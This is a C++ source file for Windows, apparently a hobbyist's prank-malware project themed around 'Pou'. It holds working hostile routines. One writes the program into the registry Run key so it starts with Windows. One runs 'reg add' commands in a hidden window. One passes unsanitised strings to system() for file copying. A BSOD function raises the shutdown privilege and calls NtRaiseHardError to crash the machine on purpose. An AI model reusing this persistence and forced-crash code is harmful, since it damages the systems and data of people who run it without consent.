#include "Common.h"

// Old regedit methods, im too dumb to make them work so im just going to use the easier one.
int editRegistry() {

	//LPCSTR subkey = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
	//PHKEY hregkey;

	//RegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, KEY_WRITE, hregkey);

	LONG lReg;
	HKEY hKey;
	lReg = RegCreateKeyEx(
		HKEY_CURRENT_USER,
		L"SOFTWARE\\Test\\Product\\IdkWhatImDoing",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS | KEY_WOW64_32KEY,
		NULL,
		&hKey,
		NULL
	);

	if (lReg != ERROR_SUCCESS) {
		std::cout << "Registry creation failed & Error No - " << GetLastError() << std::endl;
	}
	std::cout << "Registry creation Success" << std::endl;

	RegCloseKey(hKey);

	return lReg;

}

int setRegValue(LPCTSTR LOCATION) {

	LONG lReg;
	HKEY hKey;
	LPCTSTR sk = LOCATION;

	lReg = RegCreateKeyEx(
		HKEY_CURRENT_USER,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS | KEY_WOW64_32KEY,
		NULL,
		&hKey,
		NULL
	);

	if (lReg != ERROR_SUCCESS) {
		std::cout << "Registry creation failed & Error No - " << GetLastError() << std::endl;
	}
	std::cout << "Registry creation Success" << std::endl;
	lReg = RegSetValueEx(
		hKey,
		L"TEST VALUE",
		NULL,
		REG_SZ,
		(LPBYTE)sk,
		1024
	);
	RegCloseKey(hKey);
	return lReg;
}

// Functions

int setRegestryValue(string Location, string Name, string Type , string Data) {
	string finalCommand = "reg add \"" + Location + "\" /v \"" + Name + "\" /t \"" + Type + "\" /d \"" + Data + "\" /f";
	//cout << finalCommand << endl;		Not really needed, will probably remove
	LPCSTR sendingCommand = finalCommand.c_str();
	return WinExec(sendingCommand, SW_HIDE);

}

int copyFile(string file, string destination, string fileName) {
	string command = "copy \"" + file + "\" \"" + destination + "\\" + fileName + "\"";
	LPCSTR finalCommand = command.c_str();
	system(finalCommand);
}

string username() {
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA(username, &username_len);
	return username;
}

int getNumOfWindows() {
	int Num = 0;

	std::string target;
	for (HWND hwnd = GetTopWindow(NULL); hwnd != NULL; hwnd = GetNextWindow(hwnd, GW_HWNDNEXT))
	{

		if (!IsWindowVisible(hwnd))
			continue;

		int length = GetWindowTextLength(hwnd);
		if (length == 0)
			continue;

		char* title = new char[length + 1];
		GetWindowTextA(hwnd, title, length + 1);
		std::vector<std::string> keywords{ "Pou", "pou" };
		std::string input = title;


		for (const auto& keyword : keywords)
		{
			auto pos = input.find(keyword);
			if (pos != std::string::npos) {
				Num++;
			}
		}
	}


	return Num;

}

void BSOD() {
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}